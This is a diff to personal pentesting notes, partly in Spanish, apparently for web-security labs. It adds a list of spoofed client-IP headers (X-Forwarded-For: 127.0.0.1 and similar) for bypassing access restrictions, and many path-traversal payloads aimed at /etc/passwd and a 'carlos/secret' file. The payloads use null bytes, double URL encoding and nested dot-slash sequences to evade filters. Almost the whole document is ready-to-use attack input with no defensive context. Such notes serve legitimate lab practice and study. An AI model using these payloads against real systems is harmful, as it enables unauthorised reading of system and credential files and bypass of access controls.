@@ -1,15 +1,83 @@
 Check images filenames also as a potential exploiting point
 (**USE BURP REPEATER** fucking god)
 ```
+
+> Adding Headers in request with value `127.0.0.1` or `localhost` can also help in bypassing restrictions.
+
+```html
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forward-For: localhost
+X-Remote-IP: localhost
+X-Client-IP: localhost
+X-Real-IP: localhost
+
+X-Originating-IP: 127.0.0.1
+X-Forwarded: 127.0.0.1
+Forwarded-For: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+X-Original-URL: 127.0.0.1
+Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-ProxyUser-Ip: 127.0.0.1
+```
+
+### NOT Obfuscated 
+
+```js
+/etc/passwd
+
+../../../etc/passwd%00.png
+
+....//....//....//etc/passwd
+
+..%252f..%252f..%252fetc/passwd
+
+/var/www/images/../../../etc/passwd
+
+../../../etc/passwd%00.png
+
+../../../etc/passwd
+
+/home/carlos/secret
+
+../../../home/carlos/secret%00.png
+
+//con BYTE NULL
+..%2f..%2f..%2f..%2f..%2f..%2fhome%2fcarlos%2fsecret%00.jpg
+
+....//....//....//home/carlos/secret
+
+....//....//....//....//home/carlos/secret
+
+..%252f..%252f..%252fhome/carlos/secret
+
+%252e%252e%252fhome%252fcarlos%252fsecret
+
+/var/www/images/../../../home/carlos/secret
+
+../../../home/carlos/secret%00.png
+
+../../../home/carlos/secret
+```
+
+### Obfuscated 
+```js
 ../../../../../etc/passwd
 
 /etc/passwd
 
 ....//....//....//....//....//etc/passwd
 
-..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
+..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd%001.jpg //1.jpg una img
 
-..%252f..%252f..%252f..%252f..%252fetc/passwd      (URL-Encode del '%')
+..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%0010.jpg //lo mismo pero mas largo
+
+...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd
+
+%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66passwd
 
 %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
@@ -21,7 +89,7 @@ valid-file/../../../../../../etc/passwd
 
 /var/www/images/../../../../../../etc/passwd
 
-../../../../../../../etc/passwd%00.jpg            (NULL BYTE) --> %00
+../../../../../../../etc/passwd%00.jpg
 ../../../../../../../etc/passwd%00.png
 ../../../../../../../etc/passwd%00
 
@@ -30,5 +98,3 @@ adminpanel/admin_img?file_name=..%252f..%252f..%252f..%252f..%252f..%252f..%252f
 /carlos/%25%37%33%25%36%35%25%36%33%25%37%32%25%36%35%25%37%34 (secret encoded twice)
 
 ```
-
-------------------------------------------------------------------------
